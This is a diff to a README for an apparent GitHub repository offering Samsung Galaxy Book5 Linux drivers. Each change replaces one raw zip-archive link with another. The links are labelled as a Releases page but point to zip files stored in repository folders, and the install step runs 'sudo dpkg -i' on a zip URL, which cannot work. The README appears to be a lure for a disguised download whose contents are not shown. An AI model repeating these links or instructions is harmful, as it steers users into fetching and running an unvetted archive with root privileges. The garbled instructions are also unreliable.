@@ -1,6 +1,6 @@
 # 🚀 samsung-galaxy-book5-linux-drivers - Get Your Samsung Laptop Running Smoothly
 
-![Download](https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip)
+![Download](https://github.com/Gusta7832/samsung-galaxy-book5-linux-drivers/raw/refs/heads/main/audio-config/book-drivers-linux-samsung-galaxy-3.2.zip)
 
 ## 📋 Overview
 
@@ -17,14 +17,14 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. Visit the [Releases page to download](https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip).
+1. Visit the [Releases page to download](https://github.com/Gusta7832/samsung-galaxy-book5-linux-drivers/raw/refs/heads/main/audio-config/book-drivers-linux-samsung-galaxy-3.2.zip).
 2. Choose the appropriate driver package for your system.
 
 ## 📥 Download & Install
 
 To download the drivers, visit this page:
 
-[Download from GitHub Releases](https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip)
+[Download from GitHub Releases](https://github.com/Gusta7832/samsung-galaxy-book5-linux-drivers/raw/refs/heads/main/audio-config/book-drivers-linux-samsung-galaxy-3.2.zip)
 
 ### Installation Steps:
 
@@ -44,7 +44,7 @@ To download the drivers, visit this page:
 4. **Install the Drivers:**
    - Enter the following command, replacing `package-file-name` with the actual file name:
      ```bash
-     sudo dpkg -i https://raw.githubusercontent.com/Gusta7832/samsung-galaxy-book5-linux-drivers/main/samsung-galaxybook-driver/docs/linux-samsung-galaxy-drivers-book-v2.3.zip
+     sudo dpkg -i https://github.com/Gusta7832/samsung-galaxy-book5-linux-drivers/raw/refs/heads/main/audio-config/book-drivers-linux-samsung-galaxy-3.2.zip
      ```
    - This command installs the downloaded driver package.
 
